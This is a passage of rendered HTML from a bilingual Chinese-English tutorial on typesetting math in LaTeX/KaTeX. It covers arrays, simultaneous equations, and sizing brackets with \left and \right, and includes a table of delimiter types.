class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mrel">=</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mrel">=</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></td><td style="text-align:left">\begin{array}{lcr}<br>z &amp; = &amp; a \\<br>f(x,y,z) &amp; = &amp; x + y + z<br>\end{array}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">方程组<br/>Simultaneous equations</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3</mn><mi>x</mi><mo>+</mo><mn>5</mn><mi>y</mi><mo>+</mo><mi>z</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>7</mn><mi>x</mi><mo>−</mo><mn>2</mn><mi>y</mi><mo>+</mo><mn>4</mn><mi>z</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>6</mn><mi>x</mi><mo>+</mo><mn>3</mn><mi>y</mi><mo>+</mo><mn>2</mn><mi>z</mi></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases} 3x + 5y + z \\ 7x - 2y + 4z \\ -6x + 3y + 2z \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.9099999999999997em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35002em;"><span style="top:-2.19999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.19499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.2950099999999996em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.30501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.60002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8500199999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">3</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">5</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">7</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">−</span><span class="mord">6</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">3</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></td><td style="text-align:left">\begin{cases}<br>3x + 5y + z \\<br>7x - 2y + 4z \\<br>-6x + 3y + 2z<br>\end{cases}</td></tr><tr><td style="text-align:left">数组<br/>Arrays</td><td style="text-align:left">$\begin{array}{</td><td style="text-align:left">c</td></tr></tbody></table><h2 id="25-括号-brackets"><a class="markdownIt-Anchor" href="#25-括号-brackets"></a> 2.5 括号 Brackets</h2><p>常用的括号符号例如<code>( )[ ]&#123; &#125;……</code>这些也可以在输入环境中直接使用：</p><pre class="line-numbers language-none"><code class="language-none">2(x+y)&#x3D;z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>2</mn><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">2(x+y)=z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span></span></p><p>但如果是在较大的表达式中这些符号就显得不合适了</p><pre class="line-numbers language-none"><code class="language-none">( \frac&#123;\pi&#125;&#123;2&#125; )^n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mfrac><mi>π</mi><mn>2</mn></mfrac><msup><mo stretchy="false">)</mo><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">( \frac{\pi}{2} )^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></p><p>正确用法应配合<code>\left</code>和<code>\right</code>命令使用。</p><pre class="line-numbers language-none"><code class="language-none">\left ( \frac&#123;\pi&#125;&#123;2&#125; \right )^n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mrow><mo fence="true">(</mo><mfrac><mi>π</mi><mn>2</mn></mfrac><mo fence="true">)</mo></mrow><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">\left ( \frac{\pi}{2} \right )^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.890292em;vertical-align:-0.686em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.204292em;"><span style="top:-3.6029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></p><p>具体可参考下表。</p><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left">圆括号、小括号<br>Parentheses</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left ( \frac{a}{b} \right )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></td><td style="text-align:left">\left ( \frac{a}{b} \right )</td></tr><tr><td style="text-align:left">方括号、中括号<br/>Brackets</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">[</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">]</mo></mrow><mspace width="1em"/><mrow><mo fence="true">[</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\left [ \frac{a}{b} \right ] \quad \left \lbrack \frac{a}{b} \right \rbrack</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">]</span></span></span></span></span></span></td><td style="text-align:left">\left [ \frac{a}{b} \right ] \quad<br>\left \lbrack \frac{a}{b} \right \rbrack</td></tr><tr><td style="text-align:left">花括号、大括号<br/>Braces</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">{</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">}</mo></mrow><mspace width="1em"/><mrow><mo fence="true">{</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">}</mo></mrow></mrow><annotation encoding="application/x-tex">\left \{ \frac{a}{b} \right \} \quad \left \lbrace \frac{a}{b} \right \rbrace</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">{</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">}</span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">{</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">}</span></span></span></span></span></span></td><td style="text-align:left">\left { \frac{a}{b} \right } \quad<br>\left \lbrace \frac{a}{b} \right \rbrace</td></tr><tr><td style="text-align:left">角括号<br/>Angle brackets</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">⟨</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">⟩</mo></mrow><annotation encoding="application/x-tex">\left \langle \frac{a}{b} \right \rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">⟨</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">⟩</span></span></span></span></span></span></td><td style="text-align:left">\left \langle \frac{a}{b} \right \rangle</td></tr><tr><td style="text-align:left">单竖线和双竖线<br/>Bars and double bars</td><td style="text-align:left">$\left</td><td style="text-align:left">\frac{a}{b} \right \vert \quad \left \Vert \frac{c}{d} \right |$</td></tr><tr><td style="text-align:left">取整函数与取顶函数<br/>Floor and ceiling functions:</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">⌊</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">⌋</mo></mrow><mspace width="1em"/><mrow><mo fence="true">⌈</mo><mfrac><mi>c</mi><mi>d</mi></mfrac><mo fence="true">⌉</mo></mrow></mrow><annotation encoding="application/x-tex">\left \lfloor \frac{a}{b} \right \rfloor \quad \left \lceil \frac{c}{d} \right \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">⌊</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">⌋</span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">⌈</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">⌉</span></span></span></span></span></span></td><td style="text-align:left">\left \lfloor \frac{a}{b} \right \rfloor \quad<br>\left \lceil \frac{c}{d} \right \rceil</td></tr><tr><td style="text-align:left">斜线与反斜线<br/>Slashes and backslashes</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">/</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">\</mo></mrow><annotation encoding="application/x-tex">\left / \frac{a}{b} \right \backslash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">/</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">\</span></span></span></span></span></span></td><td style="text-align:left">\left / \frac{a}{b} \right \backslash</td></tr><tr><td style="text-align:left">上下箭头<br/>Up, down, and up-down arrows</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">↑</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">↓</mo></mrow><mspace width="1em"/><mrow><mo fence="true">⇑</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">⇓</mo></mrow><mspace width="1em"/><mrow><mo fence="true">↕</mo><mfrac><mi>a</mi><mi>b</mi></mfrac><mo fence="true">⇕</mo></mrow></mrow><annotation encoding="application/x-tex">\left \uparrow \frac{a}{b} \right \downarrow \quad \left \Uparrow \frac{a}{b} \right \Downarrow \quad \left \updownarrow \frac{a}{b} \right \Updownarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.202em;vertical-align:-0.35000999999999993em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85199em;"><span style="top:-2.25099em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.85299em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85199em;"><span style="top:-2.251em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>↓</span></span></span><span style="top:-2.25599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span><span style="top:-2.85199em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⏐</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85199em;"><span style="top:-2.25099em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.25698em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>‖</span></span></span><span style="top:-2.85299em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85199em;"><span style="top:-2.251em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner delim-size1"><span>⇓</span></span></span><span style="top:-2.25599em;"><span class="pstrut" style="height:2.601em;"></span><span class="delimsizinginner 